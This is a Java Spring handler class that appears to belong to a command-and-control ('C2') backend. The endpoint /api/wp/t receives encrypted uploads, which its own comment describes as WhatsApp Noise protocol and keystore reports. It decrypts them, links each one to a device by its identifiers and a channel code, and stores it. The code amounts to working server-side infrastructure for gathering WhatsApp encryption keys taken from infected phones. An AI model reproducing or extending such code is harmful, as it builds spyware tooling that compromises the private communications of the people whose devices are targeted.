package com.consume.service.handlers;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Propagation;
import org.springframework.transaction.annotation.Transactional;

import com.alibaba.fastjson.JSONObject;
import com.consume.service.AbstractC2Handler;
import com.consume.service.C2BusinessStore;
import com.consume.service.C2HandlerContext;

/**
 * POST /api/wp/t：WhatsApp Noise/keystore 上报。
 * <p>解密 → 设备关联（ecid/unique/serial + channel）→ wp_report 入库。
 */
@Component
public class HandleWpT extends AbstractC2Handler {

    @Autowired
    private C2BusinessStore store;

    @Override
    public String path() {
        return "/api/wp/t";
    }

    @Override
    @Transactional(propagation = Propagation.REQUIRES_NEW, rollbackFor = Exception.class)
    public void handle(C2HandlerContext ctx) throws Exception {
        if (!"POST".equalsIgnoreCase(ctx.getMethod())) {
            log.info("正常日志:[c2_handlers] /api/wp/t 非 POST，跳过, id={}", ctx.getRecordId());
            return;
        }
        resolveDomain(ctx);
        String plain = decrypt(ctx, "ecid", "unique", "serial", "channel", "userId", "phoneId");
        JSONObject pt = ctx.getPlaintext();

        String ecid = first(pt, "ecid", "d", "f");
        String unique = first(pt, "unique", "u");
        String serial = first(pt, "serial", "s");
        String channel = first(pt, "channel", "channelcode", "channelCode");
        String model = nestedStr(pt, "deviceConfig", "device");
        if (model.isEmpty()) {
            model = nestedStr(pt, "deviceConfig", "model");
        }
        String ios = nestedStr(pt, "deviceConfig", "sdk_release");

        Long rowId = deviceResolver.resolveAndLinkWithChannelCode(
                ctx, ecid, unique, serial, channel, model, ios);

        store.saveWpReport(ctx, pt);
        if (plain == null || plain.isEmpty()) {
            log.info("异常日志:[c2_handlers] /api/wp/t 解密失败或无明文, id={}", ctx.getRecordId());
        } else if (rowId == null) {
            log.info("异常日志:[c2_handlers] /api/wp/t 无设备，已尽力写库/跳过, id={}, ecid={}",
                    ctx.getRecordId(), ecid);
        }
        log.debug("正常日志:[c2_handlers] handle_wp_t 完成, id={}, rowId={}, decryptOk={}",
                ctx.getRecordId(), ctx.getDeviceRowId(), ctx.isDecryptOk());
    }

    private static String first(JSONObject o, String... keys) {
        if (o == null || keys == null) {
            return "";
        }
        for (String k : keys) {
            Object v = o.get(k);
            if (v != null) {
                String s = v.toString().trim();
                if (!s.isEmpty()) {
                    return s;
                }
            }
        }
        return "";
    }

    private static String nestedStr(JSONObject o, String objKey, String field) {
        if (o == null) {
            return "";
        }
        Object raw = o.get(objKey);
        if (!(raw instanceof JSONObject)) {
            return "";
        }
        Object v = ((JSONObject) raw).get(field);
        return v == null ? "" : v.toString();
    }
}
